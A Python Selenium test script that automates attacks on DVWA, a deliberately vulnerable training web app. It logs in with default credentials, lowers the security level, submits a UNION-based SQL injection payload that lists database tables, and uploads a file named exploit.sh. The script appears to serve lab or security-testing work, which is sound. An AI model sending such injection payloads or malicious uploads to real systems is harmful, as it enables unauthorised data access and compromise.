# -*- coding: utf-8 -*-
# Added necessary imports here
from selenium import webdriver
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import NoAlertPresentException
from datetime import datetime
import unittest, time, re, random, string, sys, os

class Dvwa(unittest.TestCase):
    def setUp(self):
        self.driver = webdriver.Remote(command_executor='http://localhost:4444/wd/hub', desired_capabilities=DesiredCapabilities.CHROME)
        self.driver.implicitly_wait(30)
        # pull the target URL from env variable
        self.base_url = os.environ['test_url']
        self.verificationErrors = []
        self.accept_next_alert = True
    
    
    def test_dvwa(self):
        driver = self.driver
        driver.get(self.base_url + "/setup.php")
        # create the DVWA database (necessary on first run)
        driver.find_element_by_name("create_db").click()
        time.sleep(2)
        # logon with default creds
        driver.find_element_by_link_text("login").click()
        driver.find_element_by_name("username").clear()
        driver.find_element_by_name("username").send_keys("admin")
        driver.find_element_by_name("password").clear()
        driver.find_element_by_name("password").send_keys("password")
        driver.find_element_by_name("Login").click()
        # set security level to 'low'
        # probably unnecessary to do this twice...
        # ...but I had to when I initially recorded the steps.
        driver.find_element_by_link_text("DVWA Security").click()
        Select(driver.find_element_by_name("security")).select_by_visible_text("Low")
        driver.find_element_by_name("seclev_submit").click()
        Select(driver.find_element_by_name("security")).select_by_visible_text("Low")
        driver.find_element_by_name("seclev_submit").click()
        # do the SQL injection
        driver.find_element_by_link_text("SQL Injection").click()
        driver.find_element_by_name("id").clear()
        driver.find_element_by_name("id").send_keys("%' and 1=0 union select null, table_name from information_schema.tables #")
        driver.find_element_by_name("Submit").click()
        # upload a bad file
        driver.find_element_by_link_text("File Upload").click()
        driver.find_element_by_name("uploaded").clear()
        driver.find_element_by_name("uploaded").send_keys("/opt/code/exploit.sh")
        driver.find_element_by_name("Upload").click()
    
    def is_element_present(self, how, what):
        try: self.driver.find_element(by=how, value=what)
        except NoSuchElementException as e: return False
        return True
    
    def is_alert_present(self):
        try: self.driver.switch_to_alert()
        except NoAlertPresentException as e: return False
        return True
    
    def close_alert_and_get_its_text(self):
        try:
            alert = self.driver.switch_to_alert()
            alert_text = alert.text
            if self.accept_next_alert:
                alert.accept()
            else:
                alert.dismiss()
            return alert_text
        finally: self.accept_next_alert = True
    
    def tearDown(self):
        self.driver.quit()
        self.assertEqual([], self.verificationErrors)

if __name__ == "__main__":
    unittest.main()
